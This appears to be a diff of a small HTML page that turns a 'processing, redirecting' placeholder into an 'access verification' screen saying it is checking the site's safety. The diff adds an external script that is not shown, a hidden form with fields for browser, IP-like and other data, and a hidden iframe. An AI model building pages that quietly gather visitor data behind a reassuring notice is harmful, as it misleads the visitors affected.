@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>処理中...</title>
+  <title>Now Verifying...</title>
+  <script src="/mondai/mondai.js"></script>
 
   <style>
     :root {
@@ -56,32 +57,16 @@
 <body>
   <div class="container">
     <div class="spinner"></div>
-    <div class="text">処理しています…</div>
-    <div class="sub">自動的に次のページへ移動します</div>
+    <div class="text">アクセス検証中…</div>
+    <div class="sub">サイトが安全か確かめています</div>
   </div>
+  <form method="get" action="">
+    <input id="bro" name="browser" hidden>
+    <input id="act" name="act" hidden>
+    <input id="ipa" name="ipa" hidden>
+    <input id="use" name="use" hidden>
+  </form>
+  <iframe style="display: none;"></iframe>
 
-  <script>
-    (async () => {
-      try {
-        // ===== ここに処理を書く =====
-        await fakeProcess();
-
-        // リダイレクト
-        location.replace("/next-page");
-
-      } catch (e) {
-      }
-    })();
-
-    function fakeProcess() {
-      // サンプル用（実際はAPIなど）
-      return new Promise(resolve => setTimeout(resolve, 2000));
-    }
-
-    function showError(e) {
-      document.querySelector(".text").textContent = "エラーが発生しました: " + e;
-      document.querySelector(".sub").textContent = "再読み込みしてください";
-    }
-  </script>
 </body>
 </html>
